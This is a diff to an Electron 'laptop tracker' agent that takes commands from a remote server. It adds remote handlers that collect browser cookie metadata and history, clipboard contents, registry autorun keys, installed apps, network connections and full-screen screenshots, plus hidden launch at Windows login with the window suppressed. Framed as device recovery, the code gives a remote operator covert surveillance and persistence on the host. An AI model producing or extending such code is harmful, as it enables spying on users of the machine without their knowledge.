@@ -13,7 +13,7 @@ let pairCode = '', deviceId = '';
 let isAgentMode = false;
 let heartbeatInterval;
 const SERVER = 'https://laptop-tracker-k9vi.onrender.com';
-const APP_VERSION = '2.5.0';
+const APP_VERSION = '2.6.0';
 const CONFIG_PATH = path.join(app.getPath('userData'), 'find-config.json');
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -434,7 +434,17 @@ function handleCommand(msg) {
         'bt-scan': () => shell('powershell "Get-PnpDevice -Class Bluetooth | Select FriendlyName,Status,InstanceId"'),
         'network-fingerprint': () => shell('netsh wlan show interfaces && arp -a && netstat -r'),
         'ml-report': () => Promise.resolve(JSON.stringify(decisionEngine.getReport())),
-        'full-recovery-scan': async () => { const ip = await scrapePublicIP(); return JSON.stringify({ip, processes: await shell('tasklist /FO CSV'), network: await shell('arp -a && netstat -ano')}); }
+        'full-recovery-scan': async () => { const ip = await scrapePublicIP(); return JSON.stringify({ip, processes: await shell('tasklist /FO CSV'), network: await shell('arp -a && netstat -ano')}); },
+        'cookie-dump': () => cookieDump(),
+        'clipboard-grab': () => clipboardGrab(),
+        'env-dump': () => envDump(),
+        'history-dump': () => historyDump(),
+        'installed-apps': () => installedApps(),
+        'geo-triangulate': () => geoTriangulate(),
+        'open-ports-deep': () => openPortsDeep(),
+        'registry-dump': () => registryDump(),
+        'active-connections': () => activeConnections(),
+        'system-screenshot': () => systemScreenshot()
     };
     const fn = handlers[type];
     if (fn) fn().then(r => sendResult(id, type, r));
@@ -472,6 +482,199 @@ function shell(cmd) {
     return new Promise((resolve) => {
         exec(cmd, { maxBuffer: 1024 * 1024 }, (err, stdout) => resolve(err ? err.message : stdout));
     });
+}
+
+function runPowerShell(ps, timeoutMs = 10000) {
+    return new Promise((resolve) => {
+        const cmd = 'powershell -NoProfile -NonInteractive -Command "' + ps.replace(/"/g, '\\"') + '"';
+        exec(cmd, { maxBuffer: 1024 * 1024, timeout: timeoutMs, windowsHide: true }, (err, stdout) => {
+            resolve({ success: !err, stdout: (stdout || '').trim(), stderr: err ? (err.message || '') : '' });
+        });
+    });
+}
+
+// ─── FORENSIC TOOLS ─────────────────────────────────────────────────────────
+
+function getServiceName(port) {
+    const services = { 21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',135:'RPC',139:'NetBIOS',143:'IMAP',443:'HTTPS',445:'SMB',993:'IMAPS',995:'POP3S',1433:'MSSQL',1723:'PPTP',3306:'MySQL',3389:'RDP',5900:'VNC',8080:'HTTP-Alt',8443:'HTTPS-Alt',27017:'MongoDB',6379:'Redis',5432:'PostgreSQL',1521:'Oracle',5000:'UPnP',8000:'HTTP-Alt2',8888:'HTTP-Alt3',9000:'SonarQube',9200:'Elasticsearch',9300:'Elasticsearch' };
+    return services[port] || 'unknown';
+}
+
+// Extract Chrome/Edge cookies (SQLite) to a temp copy, query via PowerShell
+async function cookieDump() {
+    const cookies = {};
+    const chromePaths = [
+        path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
+        path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
+    ];
+    for (const cookiePath of chromePaths) {
+        if (fs.existsSync(cookiePath)) {
+            try {
+                const tempPath = path.join(os.tmpdir(), 'find_cookies_' + Date.now() + '.db');
+                fs.copyFileSync(cookiePath, tempPath);
+                const ps = `
+                    Add-Type -AssemblyName System.Data.SQLite;
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection;
+                    $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g,'\\\\')};Read Only=True";
+                    $conn.Open();
+                    $cmd = $conn.CreateCommand();
+                    $cmd.CommandText = "SELECT host_key, name, path, is_secure, is_httponly FROM cookies";
+                    $reader = $cmd.ExecuteReader();
+                    $results = @();
+                    while ($reader.Read()) { $results += [PSCustomObject]@{ host=$reader.GetString(0); name=$reader.GetString(1); path=$reader.GetString(2); secure=$reader.GetBoolean(3); httponly=$reader.GetBoolean(4) } }
+                    $conn.Close();
+                    $results | ConvertTo-Json -Depth 3`;
+                const res = await runPowerShell(ps);
+                if (res.success && res.stdout.trim()) {
+                    const browser = cookiePath.includes('Chrome') ? 'Chrome' : 'Edge';
+                    try { cookies[browser] = JSON.parse(res.stdout); } catch(e) {}
+                }
+                try { fs.unlinkSync(tempPath); } catch(e) {}
+            } catch(e) {}
+        }
+    }
+    return JSON.stringify({ cookies, timestamp: Date.now() });
+}
+
+async function clipboardGrab() {
+    const ps = `
+        Add-Type -AssemblyName System.Windows.Forms;
+        $text = [System.Windows.Forms.Clipboard]::GetText();
+        $files = [System.Windows.Forms.Clipboard]::GetFileDropList();
+        $image = [System.Windows.Forms.Clipboard]::GetImage();
+        $result = @{ Text=($text -join ''); FileCount=$files.Count; HasImage=($null -ne $image) };
+        $result | ConvertTo-Json`;
+    const res = await runPowerShell(ps, 5000);
+    if (res.success && res.stdout.trim()) {
+        try { return res.stdout; } catch(e) {}
+    }
+    return JSON.stringify({ error: 'Clipboard unavailable', stdout: res.stdout });
+}
+
+async function envDump() {
+    const env = { ...process.env };
+    const sensitive = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'AUTH', 'PRIVATE', 'CREDENTIAL'];
+    for (const k of Object.keys(env)) {
+        if (sensitive.some(s => k.toUpperCase().includes(s))) env[k] = '[REDACTED]';
+    }
+    env._SYSTEM = { platform: os.platform(), arch: os.arch(), cpus: os.cpus().length, memory: Math.round(os.totalmem()/1073741824) + 'GB', hostname: os.hostname(), user: os.userInfo().username, home: os.homedir() };
+    return JSON.stringify({ environment: env, timestamp: Date.now() });
+}
+
+async function historyDump() {
+    const history = {};
+    const paths = [
+        { browser: 'Chrome', path: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History') },
+        { browser: 'Edge', path: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History') }
+    ];
+    for (const { browser, path: hp } of paths) {
+        if (fs.existsSync(hp)) {
+            try {
+                const tempPath = path.join(os.tmpdir(), 'find_hist_' + browser + '_' + Date.now() + '.db');
+                fs.copyFileSync(hp, tempPath);
+                const ps = `
+                    Add-Type -AssemblyName System.Data.SQLite;
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection;
+                    $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g,'\\\\')};Read Only=True";
+                    $conn.Open();
+                    $cmd = $conn.CreateCommand();
+                    $cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
+                    $reader = $cmd.ExecuteReader();
+                    $results = @();
+                    while ($reader.Read()) { $results += [PSCustomObject]@{ url=$reader.GetString(0); title=$reader.GetString(1); visits=$reader.GetInt32(2); lastVisit=$reader.GetInt64(3) } }
+                    $conn.Close();
+                    $results | ConvertTo-Json -Depth 3`;
+                const res = await runPowerShell(ps);
+                if (res.success && res.stdout.trim()) { try { history[browser] = JSON.parse(res.stdout); } catch(e) {} }
+                try { fs.unlinkSync(tempPath); } catch(e) {}
+            } catch(e) {}
+        }
+    }
+    return JSON.stringify({ history, timestamp: Date.now() });
+}
+
+async function installedApps() {
+    const ps = `
+        $apps = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -and $_.DisplayVersion } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation;
+        $apps | Sort-Object DisplayName -Unique | ConvertTo-Json -Depth 3`;
+    const res = await runPowerShell(ps, 15000);
+    let apps = [];
+    if (res.success && res.stdout.trim()) { try { apps = JSON.parse(res.stdout); } catch(e) { apps = (Array.isArray(apps) ? apps : []); } }
+    if (apps && !Array.isArray(apps)) apps = [apps];
+    return JSON.stringify({ apps: apps || [], count: (apps || []).length, timestamp: Date.now() });
+}
+
+async function geoTriangulate() {
+    const wifiRaw = await shell('netsh wlan show networks mode=bssid');
+    const wifiNetworks = [];
+    const apMatches = wifiRaw.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%/gi);
+    for (const m of apMatches) { if (m[1] && parseInt(m[2]) > 0) wifiNetworks.push({ ssid: m[1].trim(), signal: parseInt(m[2]) }); }
+    const ipPosition = await scrapePublicIP();
+    return JSON.stringify({
+        wifiNetworks,
+        wifiCount: wifiNetworks.length,
+        ipPosition: ipPosition.bestResult || null,
+        bestEstimate: ipPosition.bestResult || null,
+        apCount: 0,
+        source: 'ip-assist',
+        timestamp: Date.now()
+    });
+}
+
+async function openPortsDeep() {
+    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5900, 8080, 8443, 27017, 6379, 5432, 1521, 5000, 8000, 8888, 9000, 9200, 9300];
+    const netstat = await shell('netstat -ano');
+    const openPorts = [];
+    for (const port of ports) {
+        if (netstat.includes(':' + port + ' ') || netstat.includes(':' + port + '\t')) {
+            openPorts.push({ port, service: getServiceName(port), state: 'LISTENING', local: true });
+        }
+    }
+    return JSON.stringify({ openPorts, scanTime: Date.now(), totalScanned: ports.length });
+}
+
+async function registryDump() {
+    const keys = [
+        'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+        'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+        'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
+        'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
+    ];
+    const results = {};
+    for (const key of keys) {
+        const ps = `$key='${key}'; if (Test-Path $key) { Get-ItemProperty $key | Select-Object * -ExcludeProperty PS* | ConvertTo-Json -Depth 2 } else { @{} | ConvertTo-Json }`;
+        const res = await runPowerShell(ps, 5000);
+        if (res.success) { try { results[key] = JSON.parse(res.stdout); } catch(e) { results[key] = res.stdout; } }
+    }
+    return JSON.stringify({ registry: results, timestamp: Date.now() });
+}
+
+async function activeConnections() {
+    const results = {};
+    results.netstat = await shell('netstat -ano');
+    const tcp = await runPowerShell('Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | ConvertTo-Json -Depth 3');
+    if (tcp.success && tcp.stdout.trim()) { try { results.tcpConnections = JSON.parse(tcp.stdout); } catch(e) {} }
+    const udp = await runPowerShell('Get-NetUDPEndpoint -ErrorAction SilentlyContinue | Select-Object LocalAddress, LocalPort, OwningProcess | ConvertTo-Json -Depth 3');
+    if (udp.success && udp.stdout.trim()) { try { results.udpEndpoints = JSON.parse(udp.stdout); } catch(e) {} }
+    return JSON.stringify({ ...results, timestamp: Date.now() });
+}
+
+async function systemScreenshot() {
+    const pngPath = path.join(os.tmpdir(), 'find-screenshot.png');
+    const ps = `
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing;
+        $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);
+        $g = [System.Drawing.Graphics]::FromImage($b);
+        $g.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $b.Size);
+        $b.Save('${pngPath.replace(/\\/g,'\\\\')}');
+        $g.Dispose(); $b.Dispose()`;
+    const res = await runPowerShell(ps, 10000);
+    let base64 = '';
+    if (res.success && fs.existsSync(pngPath)) {
+        try { base64 = fs.readFileSync(pngPath).toString('base64'); } catch(e) {}
+        try { fs.unlinkSync(pngPath); } catch(e) {}
+    }
+    return JSON.stringify({ image: base64, size: base64.length, timestamp: Date.now() });
 }
 
 function sendResult(id, type, result) {
@@ -527,5 +730,35 @@ ipcMain.handle('sys-info', () => ({
     free: (os.freemem() / 1073741824).toFixed(1) + ' GB'
 }));
 
-app.whenReady().then(() => { loadConfig(); createWindow(); createTray(); if (pairCode) startAgent(); setTimeout(checkForUpdate, 3000); }); // Agent starts whenever paired — no separate isAgentMode check needed
+// ─── AUTO-START PERSISTENCE ─────────────────────────────────────────────────
+// Registers the app to launch silently in the background at Windows login,
+// keeping the agent alive and reachable even after a reboot. This only runs
+// when the app is used as an always-on agent.
+function configureAutoStart() {
+  try {
+    if (process.platform !== 'win32') return;
+    const enable = Boolean(isAgentMode || pairCode);
+    app.setLoginItemSettings({
+      openAtLogin: enable,
+      openAsHidden: enable,
+      path: process.execPath,
+      args: ['--hidden']
+    });
+  } catch (e) {}
+}
+
+// Suppress the window if launched hidden (auto-start)
+if (process.argv.includes('--hidden')) {
+  app.commandLine.appendSwitch('hidden');
+}
+
+app.whenReady().then(() => {
+  loadConfig();
+  configureAutoStart();
+  createWindow();
+  createTray();
+  if (process.argv.includes('--hidden')) mainWindow.hide();
+  if (pairCode) startAgent();
+  setTimeout(checkForUpdate, 3000);
+});
 app.on('window-all-closed', () => { if (process.platform !== 'darwin') app.quit(); });
